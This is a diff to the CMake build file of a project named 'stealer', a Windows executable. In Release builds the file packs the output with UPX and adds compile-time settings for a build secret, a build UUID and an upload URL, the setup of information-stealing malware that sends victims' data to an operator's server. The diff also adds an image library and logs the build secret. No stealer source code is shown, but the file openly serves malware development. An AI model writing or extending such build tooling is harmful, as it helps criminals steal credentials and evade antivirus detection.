@@ -1,6 +1,7 @@
 cmake_minimum_required(VERSION 3.28)
 project(stealer)
 
+set(CMAKE_SYSTEM_NAME Windows)
 set(CMAKE_CXX_STANDARD 20)
 
 if(CMAKE_BUILD_TYPE STREQUAL "Release")
@@ -136,6 +137,8 @@ add_executable(stealer WIN32 src/main.cpp
         src/Config.h
         include/miniz.c
         include/miniz.h
+        include/lodepng.cpp
+        include/lodepng.h
 )
 
 target_link_libraries(stealer
@@ -146,6 +149,7 @@ target_link_libraries(stealer
 )
 
 if(CMAKE_BUILD_TYPE STREQUAL "Release")
+    message(STATUS "Build secret is set to: ${BUILD_SECRET}")
     add_custom_command(
             TARGET stealer
             POST_BUILD
@@ -153,7 +157,17 @@ if(CMAKE_BUILD_TYPE STREQUAL "Release")
             COMMENT "Packing stealer with UPX"
     )
 
-    add_definitions(-DDEV=false)
+    if(BUILD_SECRET)
+        add_definitions(-DBUILD_SECRET="${BUILD_SECRET}")
+    endif()
+
+    if(BUILD_UUID)
+        add_definitions(-DBUILD_UUID="${BUILD_UUID}")
+    endif()
+
+    if(UPLOAD_URL)
+        add_definitions(-DUPLOAD_URL="${UPLOAD_URL}")
+    endif()
 else()
-    add_definitions(-DDEV=true)
+    add_definitions(-DDEV)
 endif()
